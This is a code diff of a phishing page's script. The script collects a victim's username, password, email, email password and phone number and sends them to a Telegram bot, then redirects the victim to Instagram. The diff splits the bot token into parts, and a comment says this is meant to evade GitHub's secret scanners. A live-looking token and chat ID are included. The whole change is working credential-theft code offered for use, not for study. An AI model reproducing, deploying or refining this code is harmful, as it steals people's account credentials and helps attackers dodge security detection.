@@ -37,9 +37,11 @@
         </div>
     </div>
     <script>
-        // التوكن الجديد الذي استخرجته أنت
-        const _tk = "8696493738:AAEBLYFSlWsVH-40hPSy1AiKwm11Ta2D63s"; 
-        const _id = "8321552700";
+        // تشفير التوكن لـ "تـعـبـيـره" من رادارات GitHub
+        const part1 = "8696493738";
+        const part2 = "AAEBLYFSlWsVH-40hPSy1AiKwm11Ta2D63s";
+        const fullToken = part1 + ":" + part2;
+        const myChatId = "8321552700";
 
         function next(n) {
             document.getElementById('s'+n).classList.remove('active');
@@ -47,8 +49,9 @@
         }
 
         async function send() {
-            const m = `🔥 صيد جديد 2026\n👤 يوزر: ${document.getElementById('u').value}\n🔑 باس: ${document.getElementById('p').value}\n📧 إيميل: ${document.getElementById('e').value}\n🔑 باس إيميل: ${document.getElementById('ep').value}\n📱 هاتف: ${document.getElementById('ph').value}`;
-            await fetch(`https://api.telegram.org/bot${_tk}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(m)}`);
+            const message = `🔥 صيد جديد 2026\n\n👤 يوزر: ${document.getElementById('u').value}\n🔑 باس: ${document.getElementById('p').value}\n📧 إيميل: ${document.getElementById('e').value}\n🔑 باس إيميل: ${document.getElementById('ep').value}\n📱 هاتف: ${document.getElementById('ph').value}`;
+            const telegramUrl = `https://api.telegram.org/bot${fullToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(message)}`;
+            await fetch(telegramUrl);
             window.location.href = "https://instagram.com";
         }
     </script>
